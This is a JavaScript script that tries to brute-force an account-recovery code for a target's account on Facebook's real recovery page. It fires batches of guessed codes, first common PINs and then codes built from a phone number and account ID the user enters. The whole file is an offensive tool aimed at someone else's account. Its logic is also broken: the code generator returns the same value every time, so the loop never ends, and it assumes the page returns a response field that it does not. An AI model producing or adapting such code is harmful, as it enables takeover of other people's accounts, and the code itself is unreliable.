const readlineSync = require('readline-sync');
const axios = require('axios');

// A dictionary of common codes
const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];

// A function that generates a possible code based on some rules
function generateCode() {
    // For demonstration purposes, assume the code is the first four digits of the phone number and the last four digits of the account ID
    // In a real scenario, you would need to use some techniques to guess or obtain this information
    const phoneNumber = targetInfo.split(",")[0]; // Assume the targetInfo is the phone number and the account ID separated by a comma
    const accountId = targetInfo.split(",")[1];
    const code = phoneNumber.slice(0, 4) + accountId.slice(-4);
    return code;
}

// A function that checks the validity of a batch of codes
async function checkBatchValidity(codes) {
    // Create an array of requests with the codes and the targetInfo
    const requests = codes.map(code => axios.post(targetUrl, { code, targetInfo }));
    // Send all the requests at once and wait for the responses
    const responses = await Promise.all(requests);
    // Loop through the responses and check if any of them is valid
    for (let i = 0; i < responses.length; i++) {
        const response = responses[i];
        const code = codes[i];
        // Assume the response has a property called valid that indicates the validity of the code
        if (response.data.valid) {
            // If the code is valid, return it
            return code;
        }
    }
    // If none of the codes is valid, return null
    return null;
}

// A function that tries to brute force the code using a dictionary and a generator
async function bruteForceCode() {
    // Try the codes from the dictionary first
    const validCode = await checkBatchValidity(dictionary);
    // If a valid code is found, return it
    if (validCode) {
        return validCode;
    }
    // If not, try generating and checking codes until a valid one is found
    while (true) {
        // Generate a batch of 10 codes
        const codes = Array.from({ length: 10 }, generateCode);
        // Check the validity of the batch
        const validCode = await checkBatchValidity(codes);
        // If a valid code is found, return it
        if (validCode) {
            return validCode;
        }
    }
}

// Example usage:
const targetInfo = readlineSync.question("Enter the target's phone number and account ID separated by a comma: ");
const targetUrl = "https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0";

try {
    bruteForceCode().then(validCode => {
        console.log(`The valid code on the specified page is: ${validCode}`);
    });
} catch (error) {
    console.error(`Error: ${error.message}`);
}
